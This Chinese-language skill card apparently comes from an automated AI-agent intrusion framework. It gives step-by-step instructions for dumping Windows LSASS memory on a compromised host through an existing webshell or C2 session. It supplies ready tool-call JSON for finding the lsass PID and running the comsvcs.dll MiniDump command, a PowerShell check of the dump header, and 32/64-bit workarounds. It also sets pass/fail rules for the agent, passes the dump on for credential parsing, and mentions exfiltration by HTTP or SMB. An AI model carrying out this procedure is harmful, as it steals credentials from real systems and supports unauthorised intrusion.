---
name: comsvcs-minidump
handover: session
description: comsvcs.dll MiniDump — 用系统自带组件转储 LSASS（T1003.001 · lsass）
metadata:
  predicates:
  - T1003.001
  platforms:
  - windows
  keywords:
  - exploit.comsvcs_minidump
  - method
  - position
  - msf
  - pws
  - http
  - T1003.001
  - comsvcs
  - minidump
  resources: []
  categories:
  - action-method
  aliases:
  - comsvcs
  - minidump
  - LSASS
  - dump
  parameters:
  - host
  - dump_path
  when:
    method: dump
    target: lsass
  requires:
  - shell
  excludes: []
  carriers:
  - shell
  - cmd
  - powershell
serves:
- T1003.001
---

## 适用场景

目标是 Windows 主机，已有可用的 webshell / C2 / agent 命令通道，且当前身份能读 `lsass`（管理员或 SYSTEM）。本卡回答的是：**能不能用系统自带组件在目标本机产出这份转储产物**。

- 转储在目标本机执行，使用 Windows 自带组件，不落地第三方转储工具；当前固定模板用于 64 位 Windows 上的 32 位通道上下文。
- 标准工具机需具备 Python 3 与已绑定会话的通道客户端；目标侧需具备 `cmd.exe`、PowerShell、`rundll32.exe` 与 `comsvcs.dll`。
- 无管理员 / SYSTEM 权限，或 `lsass` 受 PPL 保护且无驱动可用时**不适用**；已有系统级 meterpreter 时改用 `exploit.kiwi_lsass_dump`。
- 产物是几十 MB 级的 `.dmp` 文件，后续交 `exploit.pypykatz_parse`；**回读文件头只证明转储产物，不证明已取得凭据**。产物落在目标磁盘上，会改变目标文件状态。
- 输入见 `skill.json`：`session_ref` 为运行现场提供的必需会话引用；`dump_path` 为配置提供的可选落盘路径（ASCII 路径），省略时沿用入口既有默认。

## 参数

- 输入 `session_ref`：来自 runtime
- 输入 `dump_path`：来自 config（可选）
- 交付：evidence
- 执行位置：position
- 可用工具：cmd、session
- 图适用：technique=T1003.001

## 步骤

**一条一个动作块**：一次答复只给一个请求；不拼长行、不发数组、不把多步塞进一条命令。

**进入条件（先看这条）**：本节点要的会话**已经登记**（运行层在 `context.execution` 里给出）；本卡在那条会话的执行面上跑，**不起监听、不新建会话、不查作业列表**。本卡只负责"点火导出 dump"；**解析是 `pypykatz-parse` 卡的事**，本卡不要就地解析。

主路径是 `rundll32.exe <comsvcs_dll_path>,MiniDump <pid> <dump_path> full`：用系统组件 `comsvcs.dll` 的 MiniDump 导出函数做进程完整转储。
（既有替代工具为 `procdump64.exe -ma lsass.exe`（需落地工具）或任务管理器手动转储（需交互）；本卡固定使用系统组件。）

**先查 PID（一次只读，必须做）**：

```text
{"tool":"run_command","target":"session","arguments":{"interpreter":"cmd","command":"tasklist /fi \"imagename eq lsass.exe\" /fo csv /nh"}}
```

从回执的 CSV 里取 `lsass.exe` 的 PID。下面的 `<pid>` **只能**用这个值；不要猜、不要在点火后重新查（进程重启会让 PID 变化，旧 PID 的转储会失败）。

固定 cmd 模板（首选；目标上 `powershell` 不一定在 PATH，`rundll32` 是系统组件）：

```text
%SystemRoot%\System32\rundll32.exe %SystemRoot%\System32\comsvcs.dll,MiniDump <pid> <dump_path> full
```

同一行直接送 `cmd`，不要套 `powershell -Command`，也不要套 `< nul`；`rundll32` 不读 stdin，运行层会在命令后追加结束标记。

**点火到这里为止：一次调用只点火，不在同一条命令里等待。**

回读（`HOST=` / `PID=` / `PATH=` / `SIZE=` / `MAGIC=`，MAGIC 为文件头 4 字节）放到**下一次调用**再做——等待会被执行窗口截断，是实测过的坑。

回读命令模板（下一次调用；用完整 PowerShell 路径，脚本内只用单引号，避免 cmd 引号转义）：

```text
%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command "$d='<dump_path>'; 'HOST=' + $env:COMPUTERNAME; 'PID=' + ((Get-Process lsass).Id); 'PATH=' + $d; if (Test-Path $d) { 'SIZE=' + (Get-Item $d).Length; 'MAGIC=' + [Text.Encoding]::ASCII.GetString([IO.File]::ReadAllBytes($d)[0..3]) } else { 'SIZE=missing'; 'MAGIC=missing' }"
```

`MAGIC` 必须是字面量 `MDMP`（不是十六进制转录、不是 base64 片段）；`SIZE` 是文件字节数。不要用 `certutil -encodehex` 后让模型自己猜文件头。

**本步（点火）的完成依据**：命令已送入通道，回执 `return_code=0`，且没有 `ERROR` / `Access denied` / `拒绝访问` / `timed_out` → 本步判 `passed`、`action_complete=false`。**不要因为这一步还没有 `MDMP` 产物就判 `unknown`**；产物由下一次回读证明。

**回读步（下一次调用）**：拿到 `HOST=` / `PID=` / `PATH=` / `SIZE=` / `MAGIC=` 且 `MAGIC=MDMP`、大小可判读 → 本步判 `passed`、`action_complete=true`；头部不是 `MDMP` 或明确为零 → `failed`；没有可解析回读 → `unknown`。

入口实际送入通道的形状是**一条命令行**、`tool` 写 `cmd`（`name` 只是标注，运行层在本步绑定的那条会话上执行它）：

```text
{"tool":"run_command","target":"session","arguments":{"interpreter":"cmd","command":"%SystemRoot%\\System32\\rundll32.exe %SystemRoot%\\System32\\comsvcs.dll,MiniDump <pid> <dump_path> full"}}
```

`cmd` 直接执行这一行；不需要 `< nul`。如果通道是 32 位进程，把可执行文件换成 `%SystemRoot%\Sysnative\rundll32.exe`（DLL 仍用 `%SystemRoot%\System32\comsvcs.dll`）；不要套 PowerShell，也不要把路径写死成某个盘的绝对路径。

回执读法：`stdout` 是目标回显原文，`return_code` 是命令终态；`return_code` 非零且有 `timed_out=true` 只说明**这次没拿到确认**，不说明通道坏了——不要据此换通道、起监听或改判会话失效，按现场证据决定重试还是换用另一张卡。**点火成立不等于产物合格**，产物判据见「完成依据」。

方法层可按现场选择落盘路径、是否先清理旧文件、等待时长、超时及后续外带方式（HTTP 上传 / SMB / 通道回读）；当前固定入口只绑定已声明输入：清理同名旧文件与 `sysnative` + `System32` 的位数口径、`MDMP` 判据与 marker 口径**不可更改**。


## 完成依据

**`finish.verdict` 判本卡要求的事实是否成立（这次转储是否产出了合格产物），不是“命令是否跑完”。**

三个阻断闸为 freshness、target、effect；`identity_rule=null`。

- **freshness**：核对本次 `call_id`、执行状态及原始输出中的本次 marker。
- **target**：把回读的 `HOST=`（`hostname`）与节点目标核对。
- **effect**：沿用注册规则 `dump_magic_mdmp`；同一份回读里核对 `HOST=` / `PID=` / `PATH=` / `SIZE=` / `MAGIC=`。

- **pass**：三个阻断闸都通过。
- **unsatisfied**：头部有值但**非 `MDMP`**，或头部为 `MDMP` 且可判读大小为零——事实被明确否定。
- **uncertain**：没有可解析回读、缺少文件头，或大小缺失——该规则**未把大小缺失单独设为阻断条件**，因此不能据此声称已核实正字节数，也不猜填。

机器证据字段保持 `call_id`、`hostname`、`dump_path`、`dump_size`、`dump_magic`，原始输出为 `stdout`；`PID` 保留在原始回读中。**产物成立不等于取得凭据**，凭据仍由解析卡证明。

## 失败条件

- **停止边界：本卡一次调用只点火；回读是下一次调用，不由本卡在同一条命令里等待或重试。**
- 位数：32 位进程上下文中的 `System32` 会被 WOW64 重定向到 `SysWOW64`，32 位 `comsvcs` 转储 64 位 `lsass` 可能正常返回却生成零字节文件。此时可执行文件用 `%SystemRoot%\Sysnative\rundll32.exe`，DLL 仍用 `%SystemRoot%\System32\comsvcs.dll`。
- 长度：`cmd.exe` 上限 8191 字符，HTTP 请求行约 8190 字符；超限可能表现为退出码为零但回显为空。入口在命令超过 7500 字符时主动报错，不能把空回显当成功。
- 体积与耗时：转储为几十 MB 级，耗时随体积增长；入口 `run()` 默认超时 240 秒，实际以调用参数为准。
- 输出编码：非 UTF-8 通道可能把中文变为 GBK；固定脚本只输出 ASCII 的 `KEY=VALUE`。
- 可检测性：部分 EDR/AV 对 `comsvcs` 转储有专门规则，该动作可被检测。
- **副作用**：固定脚本会先删除同名旧文件再生成转储；入口没有恢复被删旧文件或删除新产物的收尾步骤，不能把转储成功视为恢复完成。

[共享执行规则](../../src/skills/templates/execution_rules.txt)
